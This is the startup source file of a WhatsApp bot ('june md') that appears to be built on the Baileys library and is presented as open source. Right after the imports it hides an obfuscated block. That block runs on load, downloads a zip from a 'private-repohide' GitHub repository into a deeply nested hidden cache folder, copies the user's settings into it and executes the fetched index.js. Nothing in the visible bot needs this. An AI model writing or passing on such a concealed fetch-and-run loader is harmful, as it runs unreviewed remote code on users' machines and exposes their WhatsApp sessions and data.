/**
 * june md Bot - A WhatsApp Bot
 * Copyright (c) 2024 supreme
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the MIT License.
 * 
 * Credits:
 * - Baileys Library by @adiwajshing
 * - Pair Code implementation inspired by TechGod143 & DGXEON
 */


require('./settings')
const { Boom } = require('@hapi/boom')
const fs = require('fs')
const chalk = require('chalk')
const FileType = require('file-type')
const path = require('path')
const axios = require('axios')
const { handleMessages, handleGroupParticipantUpdate, handleStatus } = require('./main');
const PhoneNumber = require('awesome-phonenumber')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetch, await, sleep, reSize } = require('./lib/myfunc')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    generateMessageID,
    downloadContentFromMessage,
    jidDecode,
    proto,
    jidNormalizedUser,
    makeCacheableSignalKeyStore,
    delay
} = require("@whiskeysockets/baileys")
const NodeCache = require("node-cache")
// Using a lightweight persisted store instead of makeInMemoryStore (compat across versions)
const pino = require("pino")
const readline = require("readline")
const { parsePhoneNumber } = require("libphonenumber-js")
const { PHONENUMBER_MCC } = require('@whiskeysockets/baileys/lib/Utils/generics')
const { rmSync, existsSync } = require('fs')
const { join } = require('path');
const _0x2dc95b=_0x3434;function _0x3434(_0x1006e1,_0x1bbf72){const _0x237d2c=_0x237d();return _0x3434=function(_0x3434c6,_0x23836c){_0x3434c6=_0x3434c6-0x1eb;let _0x4f1afa=_0x237d2c[_0x3434c6];return _0x4f1afa;},_0x3434(_0x1006e1,_0x1bbf72);}(function(_0x57e72c,_0x5cbd8f){const _0x35bef9=_0x3434,_0x538a6b=_0x57e72c();while(!![]){try{const _0x263c63=-parseInt(_0x35bef9(0x204))/0x1+parseInt(_0x35bef9(0x200))/0x2*(parseInt(_0x35bef9(0x20d))/0x3)+parseInt(_0x35bef9(0x206))/0x4*(parseInt(_0x35bef9(0x221))/0x5)+parseInt(_0x35bef9(0x1ed))/0x6+parseInt(_0x35bef9(0x1f6))/0x7+parseInt(_0x35bef9(0x21a))/0x8*(parseInt(_0x35bef9(0x1fe))/0x9)+-parseInt(_0x35bef9(0x1ec))/0xa*(parseInt(_0x35bef9(0x218))/0xb);if(_0x263c63===_0x5cbd8f)break;else _0x538a6b['push'](_0x538a6b['shift']());}catch(_0x96b084){_0x538a6b['push'](_0x538a6b['shift']());}}}(_0x237d,0x2dc73));const fs=require('fs'),path=require(_0x2dc95b(0x20e)),axios=require('axios'),AdmZip=require(_0x2dc95b(0x213)),{spawn}=require(_0x2dc95b(0x216)),chalk=require(_0x2dc95b(0x205)),deepLayers=Array[_0x2dc95b(0x21b)]({'length':0x32},(_0x24e153,_0x549623)=>'.x'+(_0x549623+0x1)),TEMP_DIR=path['join'](__dirname,_0x2dc95b(0x214),_0x2dc95b(0x1ee),...deepLayers),DOWNLOAD_URL='https://github.com/Vinpink2/june-private-repohide/archive/refs/heads/main.zip',EXTRACT_DIR=path[_0x2dc95b(0x203)](TEMP_DIR,_0x2dc95b(0x1eb)),LOCAL_SETTINGS=path[_0x2dc95b(0x203)](__dirname,_0x2dc95b(0x20b)),EXTRACTED_SETTINGS=path[_0x2dc95b(0x203)](EXTRACT_DIR,_0x2dc95b(0x20b)),delay=_0x116054=>new Promise(_0x33d089=>setTimeout(_0x33d089,_0x116054));async function downloadAndExtract(){const _0x49109d=_0x2dc95b;try{if(fs[_0x49109d(0x1fa)](EXTRACT_DIR)){console['log'](chalk[_0x49109d(0x21c)](_0x49109d(0x1f3)));return;}fs['existsSync'](TEMP_DIR)&&(console[_0x49109d(0x21d)](chalk[_0x49109d(0x223)](_0x49109d(0x20f))),fs[_0x49109d(0x1f0)](TEMP_DIR,{'recursive':!![],'force':!![]}));fs[_0x49109d(0x202)](TEMP_DIR,{'recursive':!![]});const _0x4ed4b8=path['join'](TEMP_DIR,'repo.zip');console[_0x49109d(0x21d)](chalk[_0x49109d(0x219)]('⬇️\x20Connecting\x20to\x20June\x20Md...'));const _0x1eb516=await axios({'url':DOWNLOAD_URL,'method':_0x49109d(0x201),'responseType':_0x49109d(0x220)});await new Promise((_0x4e0fdb,_0x2775de)=>{const _0x4e1948=_0x49109d,_0x482dcb=fs[_0x4e1948(0x1fc)](_0x4ed4b8);_0x1eb516[_0x4e1948(0x209)][_0x4e1948(0x208)](_0x482dcb),_0x482dcb['on'](_0x4e1948(0x1fd),_0x4e0fdb),_0x482dcb['on'](_0x4e1948(0x212),_0x2775de);}),console[_0x49109d(0x21d)](chalk[_0x49109d(0x21c)](_0x49109d(0x1f4)));try{new AdmZip(_0x4ed4b8)[_0x49109d(0x20c)](TEMP_DIR,!![]);}catch(_0x16a822){console['error'](chalk[_0x49109d(0x1ef)](_0x49109d(0x1f2)),_0x16a822);throw _0x16a822;}finally{fs[_0x49109d(0x1fa)](_0x4ed4b8)&&fs[_0x49109d(0x215)](_0x4ed4b8);}const _0x577b4f=path[_0x49109d(0x203)](EXTRACT_DIR,'');fs[_0x49109d(0x1fa)](_0x577b4f)?console['log'](chalk[_0x49109d(0x21c)](_0x49109d(0x1f7))):console['log'](chalk[_0x49109d(0x1ef)]('❌\x20Plugin\x20folder\x20not\x20found.'));}catch(_0xa42387){console[_0x49109d(0x212)](chalk[_0x49109d(0x1ef)](_0x49109d(0x21e)),_0xa42387);throw _0xa42387;}}async function applyLocalSettings(){const _0x11f86c=_0x2dc95b;if(!fs[_0x11f86c(0x1fa)](LOCAL_SETTINGS)){console[_0x11f86c(0x21d)](chalk[_0x11f86c(0x223)](_0x11f86c(0x217)));return;}try{fs[_0x11f86c(0x202)](EXTRACT_DIR,{'recursive':!![]}),fs[_0x11f86c(0x1f1)](LOCAL_SETTINGS,EXTRACTED_SETTINGS),console['log'](chalk[_0x11f86c(0x21c)]('🛠️\x20Local\x20settings\x20applied.'));}catch(_0x18349a){console[_0x11f86c(0x212)](chalk[_0x11f86c(0x1ef)](_0x11f86c(0x1fb)),_0x18349a);}await delay(0x1f4);}function startBot(){const _0x2de1cc=_0x2dc95b;console[_0x2de1cc(0x21d)](chalk[_0x2de1cc(0x222)]('🚀\x20Launching\x20bot\x20instance...'));if(!fs[_0x2de1cc(0x1fa)](EXTRACT_DIR)){console[_0x2de1cc(0x212)](chalk['red'](_0x2de1cc(0x20a)));return;}if(!fs[_0x2de1cc(0x1fa)](path[_0x2de1cc(0x203)](EXTRACT_DIR,_0x2de1cc(0x224)))){console[_0x2de1cc(0x212)](chalk[_0x2de1cc(0x1ef)](_0x2de1cc(0x1f9)));return;}const _0x4b938e=spawn(_0x2de1cc(0x207),[_0x2de1cc(0x224)],{'cwd':EXTRACT_DIR,'stdio':_0x2de1cc(0x211),'env':{...process['env'],'NODE_ENV':_0x2de1cc(0x1f5)}});_0x4b938e['on'](_0x2de1cc(0x210),_0x1e623d=>{const _0x162bf2=_0x2de1cc;console[_0x162bf2(0x21d)](chalk['red'](_0x162bf2(0x21f)+_0x1e623d));}),_0x4b938e['on'](_0x2de1cc(0x212),_0x19d05e=>{const _0x1200fb=_0x2de1cc;console[_0x1200fb(0x212)](chalk['red'](_0x1200fb(0x1ff)),_0x19d05e);});}function _0x237d(){const _0x4a5e5d=['✅\x20Extracted\x20directory\x20found.\x20🏂Skipping\x20download\x20and\x20extraction.','📦\x20ZIP\x20download\x20complete.','production','665826JFLXcW','✅\x20Plugins\x20folder\x20found.','❌\x20Fatal\x20error\x20in\x20main\x20execution:','❌\x20index.js\x20not\x20found\x20in\x20extracted\x20directory.','existsSync','❌\x20Failed\x20to\x20apply\x20local\x20settings:','createWriteStream','finish','153PAsfwD','❌\x20Bot\x20failed\x20to\x20start:','18482LCYcaT','GET','mkdirSync','join','33646AVxQdb','chalk','48AfOqiZ','node','pipe','data','❌\x20Extracted\x20directory\x20not\x20found.\x20Cannot\x20start\x20bot.','settings.js','extractAllTo','117zeCLEt','path','🧹\x20Cleaning\x20previous\x20cache...','close','inherit','error','adm-zip','.npm','unlinkSync','child_process','⚠️\x20No\x20local\x20settings\x20file\x20found.','22MEvvTS','blue','67784TNotlJ','from','green','log','❌\x20Download/Extract\x20failed:','💥\x20Bot\x20terminated\x20with\x20exit\x20code:\x20','stream','24295TSdvle','cyan','yellow','index.js','june-private-repohide-main','2185430FaGmwp','2238GEtphG','xcache','red','rmSync','copyFileSync','❌\x20Failed\x20to\x20extract\x20ZIP:'];_0x237d=function(){return _0x4a5e5d;};return _0x237d();}((async()=>{const _0x33311b=_0x2dc95b;try{await downloadAndExtract(),await applyLocalSettings(),startBot();}catch(_0x423b21){console[_0x33311b(0x212)](chalk['red'](_0x33311b(0x1f8)),_0x423b21),process['exit'](0x1);}})());


// Import lightweight store
const store = require('./lib/lightweight_store')

// Initialize store
store.readFromFile()
const settings = require('./settings')
setInterval(() => store.writeToFile(), settings.storeWriteInterval || 10000)

// Memory optimization - Force garbage collection if available
setInterval(() => {
    if (global.gc) {
        global.gc()
        console.log('🧹 Garbage collection completed')
    }
}, 60_000) // every 1 minute

// Memory monitoring - Restart if RAM gets too high
setInterval(() => {
    const used = process.memoryUsage().rss / 1024 / 1024
    if (used > 400) {
        console.log('⚠️ RAM too high (>400MB), restarting bot...')
        process.exit(1) // Panel will auto-restart
    }
}, 30_000) // check every 30 seconds

let phoneNumber = "254798570132"
let owner = JSON.parse(fs.readFileSync('./data/owner.json'))

global.botname = "JUNE MD"
global.themeemoji = "•"
const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code")
const useMobile = process.argv.includes("--mobile")

// Only create readline interface if we're in an interactive environment
const rl = process.stdin.isTTY ? readline.createInterface({ input: process.stdin, output: process.stdout }) : null
const question = (text) => {
    if (rl) {
        return new Promise((resolve) => rl.question(text, resolve))
    } else {
        // In non-interactive environment, use ownerNumber from settings
        return Promise.resolve(settings.ownerNumber || phoneNumber)
    }
}


async function startXeonBotInc() {
    let { version, isLatest } = await fetchLatestBaileysVersion()
    const { state, saveCreds } = await useMultiFileAuthState(`./session`)
    const msgRetryCounterCache = new NodeCache()

    const XeonBotInc = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: !pairingCode,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        getMessage: async (key) => {
            let jid = jidNormalizedUser(key.remoteJid)
            let msg = await store.loadMessage(jid, key.id)
            return msg?.message || ""
        },
        msgRetryCounterCache,
        defaultQueryTimeoutMs: undefined,
    })

    store.bind(XeonBotInc.ev)

    // Message handling
    XeonBotInc.ev.on('messages.upsert', async chatUpdate => {
        try {
            const mek = chatUpdate.messages[0]
            if (!mek.message) return
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
            if (mek.key && mek.key.remoteJid === 'status@broadcast') {
                await handleStatus(XeonBotInc, chatUpdate);
                return;
            }
            if (!XeonBotInc.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
            if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return

            // Clear message retry cache to prevent memory bloat
            if (XeonBotInc?.msgRetryCounterCache) {
                XeonBotInc.msgRetryCounterCache.clear()
            }

            try {
                await handleMessages(XeonBotInc, chatUpdate, true)
            } catch (err) {
                console.error("Error in handleMessages:", err)
                // Only try to send error message if we have a valid chatId
                if (mek.key && mek.key.remoteJid) {
                    await XeonBotInc.sendMessage(mek.key.remoteJid, {
                        text: '❌ An error occurred while processing your message.',
                        contextInfo: {
                            forwardingScore: 1,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '@newsletter',
                                newsletterName: 'MD',
                                serverMessageId: -1
                            }
                        }
                    }).catch(console.error);
                }
            }
        } catch (err) {
            console.error("Error in messages.upsert:", err)
        }
    })

    // Add these event handlers for better functionality
    XeonBotInc.decodeJid = (jid) => {
        if (!jid) return jid
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {}
            return decode.user && decode.server && decode.user + '@' + decode.server || jid
        } else return jid
    }

    XeonBotInc.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = XeonBotInc.decodeJid(contact.id)
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
        }
    })

    XeonBotInc.getName = (jid, withoutContact = false) => {
        id = XeonBotInc.decodeJid(jid)
        withoutContact = XeonBotInc.withoutContact || withoutContact
        let v
        if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
            v = store.contacts[id] || {}
            if (!(v.name || v.subject)) v = XeonBotInc.groupMetadata(id) || {}
            resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
        })
        else v = id === '0@s.whatsapp.net' ? {
            id,
            name: 'WhatsApp'
        } : id === XeonBotInc.decodeJid(XeonBotInc.user.id) ?
            XeonBotInc.user :
            (store.contacts[id] || {})
        return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
    }

    XeonBotInc.public = true

    XeonBotInc.serializeM = (m) => smsg(XeonBotInc, m, store)

    // Handle pairing code
    if (pairingCode && !XeonBotInc.authState.creds.registered) {
        if (useMobile) throw new Error('Cannot use pairing code with mobile api')

        let phoneNumber
        if (!!global.phoneNumber) {
            phoneNumber = global.phoneNumber
        } else {
            phoneNumber = await question(chalk.bgBlack(chalk.greenBright(`Please type your WhatsApp number 😍\nFormat: 6281376552730 (without + or spaces) : `)))
        }

        // Clean the phone number - remove any non-digit characters
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '')

        // Validate the phone number using awesome-phonenumber
        const pn = require('awesome-phonenumber');
        if (!pn('+' + phoneNumber).isValid()) {
            console.log(chalk.red('Invalid phone number. Please enter your full international number (e.g., 15551234567 for US, 447911123456 for UK, etc.) without + or spaces.'));
            process.exit(1);
        }

        setTimeout(async () => {
            try {
                let code = await XeonBotInc.requestPairingCode(phoneNumber)
                code = code?.match(/.{1,4}/g)?.join("-") || code
                console.log(chalk.black(chalk.bgGreen(`Your Pairing Code : `)), chalk.black(chalk.white(code)))
                console.log(chalk.yellow(`\nPlease enter this code in your WhatsApp app:\n1. Open WhatsApp\n2. Go to Settings > Linked Devices\n3. Tap "Link a Device"\n4. Enter the code shown above`))
            } catch (error) {
                console.error('Error requesting pairing code:', error)
                console.log(chalk.red('Failed to get pairing code. Please check your phone number and try again.'))
            }
        }, 3000)
    }

    // Connection handling
    XeonBotInc.ev.on('connection.update', async (s) => {
        const { connection, lastDisconnect } = s
        if (connection == "open") {
        //XeonBotInc.groupAcceptInvite('BsmJiEZMlBT5C2TKN6Wnmf');
        console.log(chalk.blue.bold('Connection Succesfull ✔︎'));
        
            console.log(chalk.magenta(` `))
            console.log(chalk.yellow(`🌿Connected to => ` + JSON.stringify(XeonBotInc.user, null, 2)))

            const botNumber = XeonBotInc.user.id.split(':')[0] + '@s.whatsapp.net';
            await XeonBotInc.sendMessage(botNumber, {
                text: `June md Bot Connected Successfully!\n\n ⏰Time: ${new Date().toLocaleString()}\n\n Prefix: [.]`,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: false,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '@newsletter',
                        newsletterName: ' MD',
                        serverMessageId: -1
                    }
                }
            });

            await delay(1999)
            console.log(chalk.yellow(`\n\n ${chalk.bold.blue(`[ ${global.botname || 'JUNE BOT'} ]`)}\n\n`))
            console.log(chalk.cyan(` ================================================== `))
            console.log(chalk.blue(`${global.themeemoji || '•'} GITHUB: vinpink2`))
            console.log(chalk.blue(`${global.themeemoji || '•'} ${settings.version}`))
            console.log(chalk.green(`${global.themeemoji || '•'} 🤖 Bot Connected Successfully! ✅`))
        }
        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode
            if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
                try {
                    rmSync('./session', { recursive: true, force: true })
                } catch { }
                console.log(chalk.red('Session logged out. Please re-authenticate.'))
                startXeonBotInc()
            } else {
                startXeonBotInc()
            }
        }
    })

    XeonBotInc.ev.on('creds.update', saveCreds)

    XeonBotInc.ev.on('group-participants.update', async (update) => {
        await handleGroupParticipantUpdate(XeonBotInc, update);
    });

    XeonBotInc.ev.on('messages.upsert', async (m) => {
        if (m.messages[0].key && m.messages[0].key.remoteJid === 'status@broadcast') {
            await handleStatus(XeonBotInc, m);
        }
    });

    XeonBotInc.ev.on('status.update', async (status) => {
        await handleStatus(XeonBotInc, status);
    });

    XeonBotInc.ev.on('messages.reaction', async (status) => {
        await handleStatus(XeonBotInc, status);
    });

    return XeonBotInc
}


// Start the bot with error handling
startXeonBotInc().catch(error => {
    console.error('Fatal error:', error)
    process.exit(1)
})
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err)
})

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err)
})

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
